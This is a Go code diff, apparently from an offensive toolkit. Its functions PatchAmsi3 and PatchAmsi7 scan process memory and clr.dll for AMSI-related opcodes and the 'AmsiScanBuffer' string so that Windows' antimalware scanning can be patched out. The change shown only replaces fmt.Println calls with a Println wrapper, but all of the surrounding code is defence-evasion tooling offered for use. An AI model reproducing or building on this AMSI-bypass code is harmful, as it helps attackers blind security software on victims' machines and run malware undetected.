@@ -44,13 +44,13 @@ func PatchAmsi3() error {
 	for {
 		// CHeck Opcode
 		opcode := *(*byte)(unsafe.Pointer(address))
-		fmt.Println(fmt.Sprintf("Opcode %0X", opcode))
+		Println(fmt.Sprintf("Opcode %0X", opcode))
 		opcodePlusOne := *(*byte)(unsafe.Pointer(addressPlusOne))
 		opcodePlusTwo := *(*byte)(unsafe.Pointer(addressPlusTwo))
-		fmt.Println(fmt.Sprintf("Opcode+1 %0X", opcodePlusOne))
+		Println(fmt.Sprintf("Opcode+1 %0X", opcodePlusOne))
 		if opcode == byte(x64_RET_INSTRUCTION_OPCODE) && opcodePlusOne == byte(x64_INT3_INSTRUCTION_OPCODE) && opcodePlusTwo == byte(x64_INT3_INSTRUCTION_OPCODE) {
 			addresdebug := startAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
-			fmt.Println(fmt.Sprintf("Found ret address at %0x", addresdebug))
+			Println(fmt.Sprintf("Found ret address at %0x", addresdebug))
 			break
 		}
 
@@ -66,7 +66,7 @@ func PatchAmsi3() error {
 		opcodeAtI := *(*uint32)(unsafe.Pointer(addressAtI))
 		if opcodeAtI == uint32(AMSI_SIGNATURE) {
 			amsiContextAddress = addressAtI
-			fmt.Println(fmt.Sprintf("Found je address at %0x", amsiContextAddress))
+			Println(fmt.Sprintf("Found je address at %0x", amsiContextAddress))
 
 			break
 		}
@@ -107,16 +107,16 @@ func PatchAmsi6() error {
 
 // Hide AmsiScanBuffer From CLR.DLL
 func PatchAmsi7() error {
-	fmt.Println("Inside PatchAmsi7")
+	Println("Inside PatchAmsi7")
 	CLRDLL := windows.NewLazyDLL("clr.dll")
 	if err := CLRDLL.Load(); err != nil {
 		return fmt.Errorf("failed to load clr.dll: %w", err)
 	}
 	var modInfo windows.ModuleInfo
-	fmt.Println("Calling Get Module Info")
+	Println("Calling Get Module Info")
 	err := windows.GetModuleInformation(windows.Handle(^uintptr(0)), windows.Handle(CLRDLL.Handle()), &modInfo, uint32(unsafe.Sizeof(modInfo)))
-	fmt.Println("Called Get Module Info")
-	fmt.Println(modInfo)
+	Println("Called Get Module Info")
+	Println(modInfo)
 	if err != nil {
 		return err
 	}
@@ -124,16 +124,16 @@ func PatchAmsi7() error {
 	targString := "AmsiScanBuffer"
 	stringSize := len(targString)
 	startAddress := CLRDLL.Handle()
-	fmt.Println("Start addredd")
+	Println("Start addredd")
 
 	amsiStringAddress := uintptr(0)
-    fmt.Println(int(modInfo.SizeOfImage)-stringSize)
+    Println(int(modInfo.SizeOfImage)-stringSize)
 	for i := 0; i < int(modInfo.SizeOfImage)-stringSize; i++ {
 
 		addressAtI := startAddress + uintptr(i)*uintptr(unsafe.Sizeof(byte(0)))
 		if memcmp(addressAtI, []byte(targString)) {
 			amsiStringAddress = addressAtI
-			fmt.Println(fmt.Sprintf("Found amsiStringAddress address at %0x", amsiStringAddress))
+			Println(fmt.Sprintf("Found amsiStringAddress address at %0x", amsiStringAddress))
 
 			break
 		}
